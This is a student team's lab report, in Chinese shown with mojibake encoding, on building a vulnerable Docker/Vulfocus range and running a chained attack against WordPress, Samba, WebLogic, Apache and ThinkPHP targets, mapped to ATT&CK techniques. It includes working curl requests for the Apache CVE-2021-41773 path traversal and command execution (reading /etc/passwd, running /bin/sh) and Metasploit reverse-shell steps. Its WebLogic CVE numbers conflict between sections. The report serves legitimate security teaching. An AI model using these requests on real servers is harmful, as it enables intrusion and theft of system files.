# ç½‘å®‰å®è·µï¼šè‡ªå®šä¹‰é¶åœºæ­å»ºã€å†…ç½‘æ¸—é€å’Œæ”»å‡»æ€»æµç¨‹

## å°ç»„æˆå‘˜åŠåˆ†å·¥
**å°šä½³æ…§**ï¼šè´Ÿè´£é•œåƒé€‰æ‹©ä¸é¶åœºè®¾è®¡ï¼Œè¿›è¡Œé•œåƒæµ‹è¯•ï¼ŒAttack Navigator æ ‡æ³¨ï¼Œä»¥åŠæŠ¥å‘Šæ±‡æ€»ã€‚

**å­™ç‘¢æ‰**ï¼šè¿›è¡Œé•œåƒæµ‹è¯•ï¼Œå¯¹å…¥å£é¶æ ‡è¿›è¡Œæ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹ï¼Œå…¥å£æ¼æ´ç¼“è§£ã€‚ 

**å¼ ç¿** :  å…¨é“¾è·¯æ”»å‡»

**ä¸æ¢¦**ï¼šå¯¹ç¬¬ä¸€å±‚å’Œç¬¬äºŒå±‚çš„å››ä¸ªé¶æ ‡è¿›è¡Œåˆ©ç”¨æ£€æµ‹ã€‚ 

**é™ˆæœ—**ï¼šå¯¹ç¬¬ä¸‰å±‚çš„ä¸€ä¸ªé¶æ ‡è¿›è¡Œåˆ©ç”¨æ£€æµ‹ï¼Œå…¥å£æ¼æ´çš„ç¼“è§£ã€‚ 

**æ¨å®‡å©·**ï¼šå…¥å£æ¼æ´çš„ç¼“è§£ä¸ä¿®å¤

### ğŸ† é¶åœºå»ºè®¾ä»»åŠ¡å®ŒæˆæŠ¥å‘Š ğŸ†
```diff
+ æ‰€æœ‰ä»»åŠ¡ 100% å®Œæˆ +
```

| ä»»åŠ¡æè¿°         | çŠ¶æ€   | è¿›åº¦å¯è§†åŒ–               |
|------------------|--------|--------------------------|
| ğŸŒ å†…éƒ¨å­ç½‘æ­å»º   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% |
| ğŸ¯ é¶æ ‡æ›´æ¢éƒ¨ç½²   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% | 
| ğŸ”— æ”»å‡»é“¾è·¯éªŒè¯   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% |
| ğŸ” æ¼æ´åˆ©ç”¨æ£€æµ‹   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% |
| ğŸ›¡ï¸ æ¼æ´ç¼“è§£ç­–ç•¥   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% | 
| âœ¨ æ¼æ´å®Œå…¨ä¿®å¤   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% |
| ğŸ“Š ATT&CKå¯è§†åŒ–   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% | 


## å®éªŒç¯å¢ƒ

* kali

* metasploit

* docker

* vulficus

## è‡ªå®šä¹‰é¶åœºè®¾è®¡
åœ¨è®¾è®¡é¶åœºæ—¶ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å¦‚ä¸‹ï¼š
* æ„å»ºå¤šç½‘æ®µã€æœ‰éš”ç¦»ç­–ç•¥çš„ç½‘ç»œç¯å¢ƒï¼ˆå†…ç½‘ã€å¤–ç½‘ã€DMZï¼‰
* æ¶µç›–åƒâ€œåˆå§‹è®¿é—®â€â€œæ¨ªå‘ç§»åŠ¨â€ç­‰ç¯èŠ‚
* æ”¯æŒçº¢é˜Ÿå®Œæˆå¤šæ¡æ”»å‡»é“¾ï¼ˆåˆå§‹è®¿é—®ã€ææƒã€æ¨ªç§»ã€æŒä¹…åŒ–ç­‰ï¼‰
* æ”¯æŒè“é˜Ÿå…¨ç¨‹æ£€æµ‹ã€ç›‘æ§ã€æº¯æºï¼ˆæµé‡ã€æ—¥å¿—ã€å‘Šè­¦ï¼‰


æˆ‘ä»¬å…ˆå¯åŠ¨vulfocusé•œåƒã€‚

![alt text](./image/1748090564315.png)

æ¥ä¸‹æ¥æˆ‘ä»¬é€‰æ‹©ç¬¦åˆè¦æ±‚ï¼Œèƒ½å¤ŸæˆåŠŸå¯åŠ¨ï¼ŒåŒæ—¶å…·æœ‰æ˜“äºæ”»å‡»çš„ç‰¹æ€§çš„é•œåƒã€‚é€šè¿‡è¯¢é—®å¤§æ¨¡å‹ï¼Œæˆ‘ä»¬åœ¨vulfocusä¸Šæ‹‰å–æ•°ä¸ªé•œåƒè¿›è¡Œæµ‹è¯•ã€‚

ç»è¿‡å¯åŠ¨æµ‹è¯•ï¼Œæ’é™¤æ‰äº†ä¸€äº›æ— æ³•æ­£å¸¸å¯åŠ¨çš„é•œåƒï¼Œæœ€åé€‰æ‹©å¦‚ä¸‹çš„é•œåƒè¿›è¡Œæ‹“æ‰‘æ­å»ºã€‚

åŒæ—¶ï¼Œæˆ‘ä»¬è®¾è®¡ç½‘å¡å¦‚ä¸‹ï¼š

![alt text](./image/1748091359862.png)

![alt text](./image/1748091090316.jpg)

![alt text](./image/1748223841631.png)

## æ¶‰åŠæ¼æ´æ¦‚è§ˆ

| é˜¶æ®µ   | å®¹å™¨é•œåƒ              | æ¼æ´ç±»å‹        | åˆ©ç”¨æ–¹å¼            |
| ---- | ----------------- | ----------- | --------------- |
| åˆå§‹   | wordpress_cve-2021-21389     | å‚ç›´è¶Šæƒæ¼æ´      | è·å–é«˜æƒé™åå°æ§åˆ¶       |
| æ¨ªå‘ç§»åŠ¨ | vulshare_nginx-php-flag | æ–‡ä»¶ä¸Šä¼ /å…±äº«æ¼æ´   | ä¸Šä¼ å·¥å…·ï¼Œä¿¡æ¯æ³„éœ²ã€è¾…åŠ©ææƒ  |
| æ¨ªå‘ç§»åŠ¨ | samba-cve_2017_7494          | è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´    | åŠ è½½æ¶æ„å…±äº«æ–‡ä»¶ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œ |
| æ ¸å¿ƒæ¸—é€ | weblogic-cve_2019_2725  | è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ | ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œæ§åˆ¶ä¸­é—´ä»¶å®¹å™¨  |
| æ ¸å¿ƒæ¸—é€ | apache-cve_2021_41773 | è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ | å‘½ä»¤æ‰§è¡Œï¼Œæ·±å…¥ä¸»æœº       |
| æ·±åº¦æ¸—é€ | thinkphp-cve_2018_1002015    | å‘½ä»¤æ‰§è¡Œæ¼æ´      | æ‰§è¡Œå‘½ä»¤ï¼Œè®¿é—®æ•°æ®åº“æˆ–æŒä¹…æ§åˆ¶ |

æµ‹è¯•æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸å¯åŠ¨ï¼Œå¾…æˆ‘ä»¬ç¼–æ’å¥½çš„åœºæ™¯å‘å¸ƒåï¼Œå°è¯•å¯åŠ¨åœºæ™¯ï¼Œå¯ä»¥æˆåŠŸå¯åŠ¨å³ä¸ºæˆåŠŸã€‚

![alt text](./image/1748089490210-1.png)

## Attack Navigatorå¯è§†åŒ–

![alt text](./image/02b7151196cffe900f96f4f7aeb7f5d.png)

**å¯è§jsonæ–‡ä»¶ã€‚**

## å…·ä½“æŠ€æœ¯ç‚¹è§£é‡Š

## å…¥å£é¶æ ‡ï¼šwordpress_cve-2021-21389:latest

  **ç¬¬ä¸€é˜¶æ®µï¼šæ³¨å†Œç»•è¿‡ï¼ˆé€»è¾‘æ¼æ´åˆ©ç”¨ï¼‰**

**æŠ“åŒ…æ³¨å†Œè¯·æ±‚ â†’ æå–æ¿€æ´»å¯†é’¥ â†’ æ„é€ æ¿€æ´»è¯·æ±‚**

* **T1190 â€“ Exploit Public-Facing Application**
  WordPress æ³¨å†Œé€»è¾‘å­˜åœ¨ç¼ºé™·ï¼Œå…è®¸æ”»å‡»è€…ç»•è¿‡æ¿€æ´»éªŒè¯ï¼Œå±äºå…¸å‹å…¬å…± Web åº”ç”¨åˆ©ç”¨ã€‚

* **T1556.003 â€“ Modify Authentication Process: Web Portal Capture**
  æ„é€ æ¿€æ´»è¯·æ±‚ã€ç»•è¿‡æ ‡å‡†éªŒè¯æµç¨‹ï¼Œå±äºè®¤è¯é€»è¾‘ç¯¡æ”¹ã€‚

* **T1071.001 â€“ Application Layer Protocol: Web**
  ä½¿ç”¨ HTTP æŠ“åŒ…ä¸é‡æ”¾æ”»å‡»ï¼ˆburp suite æ“ä½œï¼‰å‡åŸºäº Web åè®®é€šä¿¡ã€‚

---

**ç¬¬äºŒé˜¶æ®µï¼šè·å–ç®¡ç†å‘˜æƒé™ï¼ˆæƒé™æå‡ï¼‰**

**åˆ›å»ºç”¨æˆ·ç»„ â†’ è®¿é—® `/groups/create/...` åˆ›å»ºç»„ â†’ ç”¨æˆ·è¢«åŠ å…¥ç»„**

* **T1098.001 â€“ Account Manipulation: Additional Cloud Credentials / Privilege Grant**
  åˆ›å»ºç»„çš„è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…å°†è‡ªå·±çš„è´¦æˆ·æ¤å…¥ç‰¹å®šæƒé™ç»„ï¼Œè§¦å‘æƒé™æå‡é€»è¾‘ã€‚

---

**æŠ“åŒ… manage/members è¯·æ±‚ â†’ æå– X-WP-Nonce ä¸ Cookie å‚æ•°**

* **T1557.002 â€“ Man-in-the-Middle: ARP Cache Poisoning / Traffic Interception**
  è™½ç„¶ä¸æ˜¯å…¸å‹çš„ç½‘ç»œä¸­é—´äººï¼Œä½†æŠ“åŒ…å·¥å…·ï¼ˆå¦‚ Burpï¼‰æœ¬è´¨ä¸Šæ‹¦æˆªäº†ç”¨æˆ·ä¸ Web åº”ç”¨é—´é€šä¿¡ã€‚

* **T1110.001 â€“ Brute Force: Password Guessing (å¼±åŒ¹é…)**
  éå¸¸è½»å¾®é€‚ç”¨ï¼šä½¿ç”¨æš´åŠ›æ–¹å¼çŒœæµ‹éæ ‡å‡†æ¥å£å‚æ•°æˆ– tokenï¼ˆå¦‚å°è¯•è·å– X-WP-Nonceï¼‰

---

**æ„é€  POST è¯·æ±‚ â†’ `wp-json/buddypress/v1/members/me` â†’ ææƒ**

* **T1068 â€“ Exploitation for Privilege Escalation**
  æ„é€ ææƒè¯·æ±‚å±äºåˆ©ç”¨åº”ç”¨å†…éƒ¨çš„æƒé™æ¼æ´ç›´æ¥è·å–æ›´é«˜æƒé™ã€‚

* **T1078.003 â€“ Valid Accounts: Local Accounts**
  åˆ©ç”¨æœ‰æ•ˆç”¨æˆ·èº«ä»½ + X-WP-Nonce ææƒã€‚

---

**ç™»å½•åå°éªŒè¯ææƒæ•ˆæœ â†’ è®¿é—® dashboard é¡µé¢**

* **T1087.001 â€“ Account Discovery: Local Account**
  ç™»å½•åç¡®è®¤è´¦æˆ·æƒé™æ˜¯å¦ä¸º adminï¼Œå³æ˜¯å¯¹æœ¬åœ°è´¦æˆ·æƒé™çš„æ¢æµ‹è¡Œä¸ºã€‚

---

| Technique ID | Technique Name                                     | é˜¶æ®µ          | è¯´æ˜                     | æ¨èé¢œè‰²      |
| ------------ | -------------------------------------------------- | ----------- | ---------------------- | --------- |
| T1190        | Exploit Public-Facing Application                  | æ³¨å†Œç»•è¿‡        | WordPress æ¿€æ´»æµç¨‹æ¼æ´åˆ©ç”¨     | `#ff9999` |
| T1556.003    | Modify Authentication Process: Web Portal Capture  | æ³¨å†Œç»•è¿‡        | ä¼ªé€ æ¿€æ´»è¯·æ±‚ç»•è¿‡éªŒè¯æµç¨‹           | `#ffcc99` |
| T1071.001    | Application Layer Protocol: Web                    | æ³¨å†Œ/ææƒè¯·æ±‚å‘é€é˜¶æ®µ | æ‰€æœ‰ burp æ“ä½œé€šè¿‡ HTTP æ¥å£æ„é€  | `#cccccc` |
| T1098.001    | Account Manipulation: Additional Cloud Credentials | åˆ›å»ºç”¨æˆ·ç»„       | åˆ©ç”¨åˆ†ç»„æœºåˆ¶å°†ç”¨æˆ·æƒé™æŠ¬å‡          | `#66cccc` |
| T1557.002    | Man-in-the-Middle: Traffic Interception            | æŠ“åŒ…ææƒè¯·æ±‚      | Burp æŠ“åŒ…æ‹¦æˆª token ä¿¡æ¯     | `#ffdd99` |
| T1068        | Exploitation for Privilege Escalation              | æ„é€ ææƒè¯·æ±‚      | ç”¨æ¥å£æ¼æ´æå‡è§’è‰²ä¸ºç®¡ç†å‘˜          | `#ffa07a` |
| T1078.003    | Valid Accounts: Local Accounts                     | ç™»å½•åå°        | ä½¿ç”¨å·²æœ‰è´¦æˆ·è®¿é—®ç®¡ç†åå°           | `#ffff99` |
| T1087.001    | Account Discovery: Local Account                   | æƒé™éªŒè¯        | éªŒè¯ dashboard é¡µé¢åŠŸèƒ½æ˜¯å¦æ–°å¢  | `#ccffcc` |

---

## ç¬¬ä¸€å±‚é¶æ ‡ï¼šsamba-cve_2017_7494:latest

åˆ©ç”¨metasploitã€‚

| æ­¥éª¤ | æ“ä½œè¯´æ˜                                                                         |
| -- | ---------------------------------------------------------------------------- |
| â‘   | åˆ©ç”¨ `exploit/linux/samba/is_known_pipename` æ¨¡å—è§¦å‘æ¼æ´                            |
| â‘¡  | è®¾ç½® payloadç›¸å…³å‚æ•° |
| â‘¢  | å¯åŠ¨ç›‘å¬å™¨ï¼Œè·å–åå¼¹ shellï¼ˆMeterpreter / Bash / Netcatï¼‰                                |
| â‘£  | åœ¨ shell ä¸­æ‰§è¡Œå‘½ä»¤ã€ææƒã€æŒä¹…åŒ–                                                         |

---

| Technique ID  | Technique Name                                                  | é˜¶æ®µ       | è¯´æ˜                                                  |
| ------------- | --------------------------------------------------------------- | -------- | --------------------------------------------------- |
| **T1203**     | **Exploitation for Client Execution**                           | æ‰§è¡Œ       | Metasploit åˆ©ç”¨æ¼æ´æ¨¡å—ï¼ˆæ¯”å¦‚ `samba/is_known_pipename`ï¼‰è¿›è¡Œè§¦å‘ |
| **T1059.004** | **Command and Scripting Interpreter: Unix Shell**               | æ‰§è¡Œ       | è·å– shell åï¼Œé€šè¿‡ Unix shell æ‰§è¡Œå‘½ä»¤                       |
| **T1053.003** | **Scheduled Task/Job: Cron**                                  | æƒé™ç»´æŒ | æ”»å‡»è€…å¯åˆ›å»º cron æŒä¹…åŒ–ä»»åŠ¡ï¼ˆå¦‚åå¼¹ shell æŒç»­å­˜åœ¨ï¼‰                   |

---

## ç¬¬ä¸€å±‚é¶æ ‡ï¼švulshare_nginx-php-flag

###  æ”»å‡»æŠ€æœ¯ç‚¹

| ATT\&CK æŠ€æœ¯ ID | æŠ€æœ¯åç§°                                                 | æ”»å‡»é˜¶æ®µ | è¡Œä¸ºæè¿°                               |
| ------------- | ---------------------------------------------------- | ---- | ---------------------------------- |
| **T1203**     | Exploitation for Client Execution                    | æ‰§è¡Œ   | ç›´æ¥é€šè¿‡ `cmd` å‚æ•°è§¦å‘å‘½ä»¤æ‰§è¡Œæ¼æ´              |
| **T1059.001** | Command and Scripting Interpreter: PowerShell / Bash | æ‰§è¡Œ   | åœ¨ URL å‚æ•°ä¸­æ‰§è¡Œ Linux å‘½ä»¤ï¼ˆå¦‚ `ls`ã€`cat`ï¼‰ |
| **T1040**     | Network Sniffing                                     | ä¾¦å¯Ÿ   | å¯ä»¥åœ¨å®¹å™¨å†…æŠ“å–è®¿é—®æ—¥å¿—æˆ–åŒ…æ¥æ£€æµ‹æ”»å‡»è¡Œä¸º              |
| **T1595.002** | Active Scanning: Vulnerability Scanning              | ä¾¦å¯Ÿ   | æ”»å‡»è€…å¯èƒ½é€šè¿‡ Fuzz å‘ç° index.php æ¥æ”¶å‚æ•°     |

---

## ç¬¬äºŒå±‚é¶æ ‡ï¼š WebLogic â€“ CVE-2020-2555

* æ¢æµ‹ WebLogic æ§åˆ¶å°ç«¯å£
* æ„é€  T3 ååºåˆ—åŒ– Payload è·å–åå¼¹ Shell æˆ– flag
* ç›‘å¬å¹¶åˆ†æç½‘ç»œæµé‡ã€æ—¥å¿—ç¡®è®¤åˆ©ç”¨æ˜¯å¦æˆåŠŸ

| ATT\&CK æŠ€æœ¯ ID | æŠ€æœ¯åç§°                                            | é˜¶æ®µ   | è¯´æ˜                              |
| ------------- | ----------------------------------------------- | ---- | ------------------------------- |
| **T1190**     | Exploit Public-Facing Application               | åˆå§‹è®¿é—® | é€šè¿‡ååºåˆ—åŒ–æ¼æ´æ”»å‡» WebLogic             |
| **T1059.005** | Command and Scripting Interpreter: Visual Basic | æ‰§è¡Œ   | åˆ©ç”¨ T3 Payload æ‰§è¡Œæ¶æ„å‘½ä»¤            |
| **T1210**     | Exploitation of Remote Services                 | æ¨ªå‘ç§»åŠ¨ | è‹¥æ”»å‡»è€…é€šè¿‡åå¼¹ Shell è·å–æ§åˆ¶æƒé™ï¼Œå¯è¿›ä¸€æ­¥æ”»å‡»å†…ç½‘  |
| **T1040**     | Network Sniffing                                | ä¾¦å¯Ÿ   | Wireshark æŠ“åŒ…åˆ†ææ˜¯å¦å­˜åœ¨ T3 é€šä¿¡æˆ–æ¶æ„å‘½ä»¤æµé‡ |
| **T1005**     | Data from Local System                          | æ”¶é›†   | è¯»å– flag æ–‡ä»¶ä½œä¸ºé¶åœºç›®æ ‡                |
| **T1057**     | Process Discovery                               | å‘ç°   | è‹¥æ”»å‡»è€…æ¢æµ‹è¿è¡ŒæœåŠ¡ã€è¿›ç¨‹ç­‰ä¿¡æ¯                |

---

## ç¬¬äºŒå±‚é¶æ ‡ï¼šApache â€“ CVE-2021-41773

* ä½¿ç”¨ curl http://ip:port/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd è¿›è¡Œè·¯å¾„ç©¿è¶Šè¯»å–
* ä½¿ç”¨åŒæ ·æ–¹å¼è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼šå¦‚ curl 'http://ip/cgi-bin/.%2e/.%2e/.%2e/bin/sh -c "cat /flag"'
* åœ¨æœåŠ¡å™¨ç«¯åˆ†æ apache è®¿é—®æ—¥å¿—ï¼Œä½¿ç”¨ tail -f access_log | grep ".."

###  ATT\&CK Navigator æ ‡æ³¨ï¼š

| ATT\&CK æŠ€æœ¯ ID | æŠ€æœ¯åç§°                                            | é˜¶æ®µ   | è¯´æ˜                       |
| ------------- | ----------------------------------------------- | ---- | ------------------------ |
| **T1190**     | Exploit Public-Facing Application               | åˆå§‹è®¿é—® | Apache è·¯å¾„ç©¿è¶Šä¸å‘½ä»¤æ‰§è¡Œ         |
| **T1083**     | File and Directory Discovery                    | å‘ç°   | ä½¿ç”¨è·¯å¾„ç©¿è¶Šæ¼æ´æŸ¥çœ‹æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿç»“æ„      |
| **T1059.004** | Command and Scripting Interpreter: Unix Shell   | æ‰§è¡Œ   | æ‰§è¡Œå¦‚ `cat /flag` å‘½ä»¤è·å–æ•æ„Ÿæ•°æ® |
| **T1040**     | Network Sniffing                                | ä¾¦å¯Ÿ   | ä½¿ç”¨ Wireshark æŠ“å–è¯·æ±‚        |
| **T1005**     | Data from Local System                          | æ”¶é›†   | è¯»å– flag æ–‡ä»¶               |


## æœ€ç»ˆå±‚é¶æ ‡ï¼švulfocus/thinkphp-cve_2018_1002015 â€”â€” ThinkPHP æ¡†æ¶è¿œç¨‹ä»£ç æ‰§è¡Œ

| ATT\&CK æŠ€æœ¯ ID | æŠ€æœ¯åç§°                                          | æ”»å‡»é˜¶æ®µ | è¡Œä¸ºæè¿°                               |
| ------------- | --------------------------------------------- | ---- | ---------------------------------- |
| **T1190**     | Exploit Public-Facing Application             | åˆå§‹è®¿é—® | RCE åˆ©ç”¨çš„æ˜¯å…¬å¼€æœåŠ¡æ¥å£ï¼ˆThinkPHP è·¯ç”±è§£ææ¼æ´ï¼‰    |
| **T1059.004** | Command and Scripting Interpreter: Unix Shell | æ‰§è¡Œ   | æ„é€  Payload æ‰§è¡Œå‘½ä»¤                    |
| **T1082**     | System Information Discovery                  | å‘ç°   | ä½¿ç”¨ `id`ã€`whoami`ã€`uname` ç­‰å‘½ä»¤ç¡®è®¤æ‰§è¡Œèº«ä»½ |
| **T1005**     | Data from Local System                        | æ”¶é›†   | è¯»å–æœ¬åœ° `flag` æ–‡ä»¶å±äºæ•æ„Ÿä¿¡æ¯è·å–             |





## å„é•œåƒå•ç‹¬å¯åŠ¨æµ‹è¯•
**1. wordpress_cve-2021-21389:latestï¼ˆwordpresså‚ç›´è¶Šæƒï¼‰**
* CVE-2021-21389 æ˜¯ WordPress æ ¸å¿ƒä»£ç ä¸­ä¸€ä¸ªå› æƒé™éªŒè¯ä¸ä¸¥å¯¼è‡´çš„å‚ç›´è¶Šæƒæ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ­¤æ¼æ´ä»¥ä½æƒé™ç”¨æˆ·èº«ä»½æ‰§è¡Œæœ¬åº”ä»…é™ç®¡ç†å‘˜æˆ–é«˜æƒé™ç”¨æˆ·çš„æ“ä½œã€‚

* BuddyPress æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºç¤¾åŒºç«™ç‚¹çš„WordPressæ’ä»¶ã€‚å½“BuddyPresså¤„äº5.0.0-7.2.1æ—¶ï¼Œéç‰¹æƒç”¨æˆ·å¯ä»¥é€šè¿‡åˆ©ç”¨REST API æˆå‘˜ç«¯ç‚¹ï¼ˆBuddyPressä¸­ç”¨äºç®¡ç†æˆå‘˜æ•°æ®çš„APIæ¥å£ï¼‰ä¸­çš„é—®é¢˜æ¥è·å¾—ç®¡ç†å‘˜æƒé™ã€‚

![alt text](./image/1748185515738.png)

**2. c4pr1c3/vulshare_nginx-php-flag:latest**
* å‘½ä»¤æ‰§è¡Œï¼ˆCommand Executionï¼‰æ¼æ´ï¼Œå³é»‘å®¢å¯ä»¥ç›´æ¥åœ¨Webåº”ç”¨ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–è€…æ‹¿ä¸‹shellæƒé™ å‘½ä»¤æ‰§è¡Œæ¼æ´å¯èƒ½é€ æˆçš„åŸå› æ˜¯WebæœåŠ¡å™¨å¯¹ç”¨æˆ·è¾“å…¥å‘½ä»¤å®‰å…¨æ£€æµ‹ä¸è¶³ï¼Œå¯¼è‡´æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚

![alt text](./image/1748185720519.png)

**3. vulfocus/samba-cve_2017_7494:latest**

* Sambaå®ç°Windowsä¸»æœºä¸LinuxæœåŠ¡å™¨ä¹‹é—´çš„èµ„æºå…±äº«ï¼ŒLinuxæ“ä½œç³»ç»Ÿæä¾›äº†SambaæœåŠ¡ï¼ŒSambaæœåŠ¡ä¸ºä¸¤ç§ä¸åŒçš„æ“ä½œç³»ç»Ÿæ¶èµ·äº†ä¸€åº§æ¡¥æ¢ï¼Œä½¿Linuxç³»ç»Ÿå’ŒWindowsç³»ç»Ÿä¹‹é—´èƒ½å¤Ÿå®ç°äº’ç›¸é€šä¿¡ã€‚sambaåœ¨linuxç³»ç»Ÿä¸Šå®ç°SMBåè®®çš„æœåŠ¡ï¼Œä½¿ç”¨SMBåè®®åœ¨å±€åŸŸç½‘ä¸Šå…±äº«æ–‡ä»¶å’Œæ‰“å°æœº.CVE-2017-7494ï¼Œ2017å¹´5æœˆ24æ—¥Sambaå‘å¸ƒäº†4.6.4ç‰ˆæœ¬ï¼Œä¿®å¤ä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´å½±å“äº†Samba 3.5.0 ä¹‹ååˆ°4.6.4/4.5.10/4.4.14ä¸­é—´çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œå¯ä»¥è®©æ¶æ„è®¿é—®è€…è¿œç¨‹æ§åˆ¶å—å½±å“çš„Linuxå’ŒUnixæœºå™¨ã€‚

* æ­¤é•œåƒæ¨¡æ‹Ÿçš„æ˜¯Sambaæ¼æ´æœåŠ¡ï¼Œè€ŒSambaæ˜¯SMBæ–‡ä»¶å…±äº«æœåŠ¡ï¼Œå¹¶éç½‘é¡µæœåŠ¡ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥é€šè¿‡ç½‘é¡µè®¿é—®ç¡®è®¤æ˜¯å¦å¯ä»¥æˆåŠŸå¯åŠ¨ã€‚

æˆ‘ä»¬è¿›å…¥å®¹å™¨å†…éƒ¨ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨smbdæˆ–è€…nmbdè¿›ç¨‹ã€‚
![alt text](./image/1748186147419.png)


**4. vulfocus/weblogic-cve_2019_2725:latest**
* CVE-2019-2725 æ˜¯ä¸€ä¸ªå½±å“ Oracle WebLogic Server çš„ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¿™ä¸ªæ¼æ´å…è®¸æœªç»æˆæƒçš„æ”»å‡»è€…é€šè¿‡å‘é€ç²¾å¿ƒæ„é€ çš„æ¶æ„ HTTP è¯·æ±‚æ¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨äº† WebLogic çš„ XMLDecoder ååºåˆ—åŒ–æ¼æ´ï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„ payload æ¥ç»•è¿‡ Oracle å®˜æ–¹çš„è¡¥ä¸ã€‚

**5. vulfocus/apache-cve_2021_41773:latest**

* Apache HTTP Server 2.4.49ã€2.4.50ç‰ˆæœ¬å¯¹è·¯å¾„è§„èŒƒåŒ–æ‰€åšçš„æ›´æ”¹ä¸­å­˜åœ¨ä¸€ä¸ªè·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è¯»å–åˆ°Webç›®å½•å¤–çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚ç³»ç»Ÿé…ç½®æ–‡ä»¶ã€ç½‘ç«™æºç ç­‰ï¼Œç”šè‡³åœ¨ç‰¹å®šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚æ‰§è¡Œå‘½ä»¤ï¼Œæ§åˆ¶æœåŠ¡å™¨ã€‚

![alt text](./image/1748185876491.png)

**6. vulfocus/thinkphp-cve_2018_1002015:latest**
* ThinkPHP 5.0.xç‰ˆæœ¬å’Œ5.1.xç‰ˆæœ¬ä¸­å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´æºäºThinkPHPåœ¨è·å–æ§åˆ¶å™¨åæ—¶æœªå¯¹ç”¨æˆ·æäº¤çš„å‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€‚è¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡è¾“å…¥â€˜ï¼¼â€™å­—ç¬¦çš„æ–¹å¼è°ƒç”¨ä»»æ„æ–¹æ³•åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»£ç ã€‚

![alt text](./image/1748186644232.png)


## æ”»å‡»å®éªŒæ­¥éª¤

### æ­¥éª¤ä¸€ï¼šå…¥å£é¶æ ‡æ”»å‡»ï¼ˆWordPress å‚ç›´è¶Šæƒï¼ˆCVE-2021-21389ï¼‰æ¼æ´å¤ç°ï¼‰

* BuddyPress æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºç¤¾åŒºç«™ç‚¹çš„å¼€æº WordPress æ’ä»¶ã€‚åœ¨ 7.2.1 ä¹‹å‰çš„ 5.0.4 ç‰ˆæœ¬çš„ BuddyPress ä¸­ï¼Œéç‰¹æƒæ™®é€šç”¨æˆ·å¯ä»¥é€šè¿‡åˆ©ç”¨ REST API æˆå‘˜ç«¯ç‚¹ä¸­çš„é—®é¢˜æ¥è·å¾—ç®¡ç†å‘˜æƒé™ã€‚è¯¥æ¼æ´å·²åœ¨ BuddyPress 7.2.1 ä¸­ä¿®å¤ã€‚æ’ä»¶çš„ç°æœ‰å®‰è£…åº”æ›´æ–°åˆ°æ­¤ç‰ˆæœ¬ä»¥ç¼“è§£é—®é¢˜ã€‚

#### ï¼ˆä¸€ï¼‰ç¯å¢ƒæ­å»º
1. **æ‹‰å–æ‰€éœ€é•œåƒ**
   ```bash
   docker pull vulfocus/wordpress_cve-2021-21389:latest
   docker pull vulfocus/thinkphp-cve_2018_1002015:latest
   docker pull vulfocus/samba-cve_2017_7494:latest 
   docker pull c4pr1c3/vulshare_nginx-php-flag:latest
   docker pull vulfocus/apache-cve_2021_41773
   docker pull vulfocus/weblogic-cve_2020_2555
   ```
   ![1747473863077](image/homework/1747473863077.png)
   ![1747473881917](image/homework/1747473881917.png)
   ![1747473893030](image/homework/1747473893030.png)
   ![1747473905026](image/homework/1747473905026.png)
   ![1747648013574](image/homework/1747648013574.png)

2. **å¯åŠ¨vulfucusç¯å¢ƒ**
![1747896129453](image/readme/1747896129453.png)
![1747896152092](image/readme/1747896152092.png)

3. **åœºæ™¯æ­å»º&å¯åŠ¨åœºæ™¯**
![1748168018019](image/readme/1748168018019.png)

4. **æ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®åœºæ™¯åœ°å€**
![1747897882478](image/readme/1747897882478.png)

